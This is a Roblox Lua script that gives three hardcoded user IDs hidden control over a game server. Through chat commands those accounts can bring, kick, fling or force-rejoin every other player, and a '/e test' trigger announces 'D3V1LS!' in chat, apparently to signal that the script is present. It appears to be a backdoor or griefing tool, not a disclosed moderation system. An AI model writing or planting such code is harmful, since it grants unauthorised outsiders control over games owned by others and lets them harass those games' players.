local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

-- Master UserIDs with names
local masters = {
    [2520431055] = "xF4ir",
    [1518296004] = "robinbackup8",
    [434284925] = "Rihanasofi",
}

-- Function to check if a player is a master
local function isMaster(player)
    return masters[player.UserId] ~= nil
end

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

-- Function to bring players to the owner's position
local function bringPlayersToOwner(owner)
    local ownerChar = owner.Character
    if not ownerChar then return end
    local ownerCFrame = ownerChar.HumanoidRootPart.CFrame

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= owner and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not isMaster(player) then
            player.Character.HumanoidRootPart.CFrame = ownerCFrame + Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
        end
    end
end

-- Function to kick players
local function kickPlayers(parameter, owner)
    local ownerName = masters[owner.UserId]
    if parameter == "." then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= owner and not isMaster(player) then
                player:Kick(ownerName .. " Has Kicked You.")
            end
        end
    else
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower():find(parameter:lower()) and player ~= owner and not isMaster(player) then
                player:Kick(ownerName .. " Has Kicked You.")
            end
        end
    end
end

-- Function to apply a fling effect
local function flingPlayers(parameter, owner)
    if parameter == "." then
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not isMaster(player) then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
            end
        end
    else
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower():find(parameter:lower()) and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not isMaster(player) then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
            end
        end
    end
end

-- Function to make players rejoin the game
local function rejoinPlayers(parameter, owner)
    local placeId = game.PlaceId
    if parameter == "." then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= owner and not isMaster(player) then
                player:Kick("Rejoining")
                wait(1)  -- Delay to ensure the player has been kicked
                TeleportService:Teleport(placeId, player)
            end
        end
    else
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower():find(parameter:lower()) and player ~= owner and not isMaster(player) then
                player:Kick("Rejoining")
                wait(1)  -- Delay to ensure the player has been kicked
                TeleportService:Teleport(placeId, player)
            end
        end
    end
end

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

-- Handler for messages
local function onMessageReceived(player, message)
    if isMaster(player) then
        local args = message:split(" ")
        local command = args[1]:lower()
        local parameter = table.concat(args, " ", 2)

        -- Handling the test command and ensure the message "D3V1LS!" is sent only once
        if string.find(message, '/e test') then
            if not _G.hasTestBeenTriggered then  -- Check if the global flag is set
                _G.hasTestBeenTriggered = true   -- Set the flag to prevent future triggers
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("D3V1LS!", 'All')
                wait(5)  -- Reset the flag after 5 seconds if needed repeatedly
                _G.hasTestBeenTriggered = false
            end
        elseif command == "!bring" then
            bringPlayersToOwner(player)
        elseif command == "!kick" then
            kickPlayers(parameter, player)
        elseif command == "!fling" then
            flingPlayers(parameter, player)
        elseif command == "!rejoin" or command == "!rj" then
            rejoinPlayers(parameter, player)
        end
    end
end 

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

-- Connect to the chat event of each player
local function connectPlayer(player)
    player.Chatted:Connect(function(message)
        onMessageReceived(player, message)
    end)
end

-- Connect all current players
for _, player in ipairs(Players:GetPlayers()) do
    connectPlayer(player)
end

-- Connect future players
Players.PlayerAdded:Connect(connectPlayer)
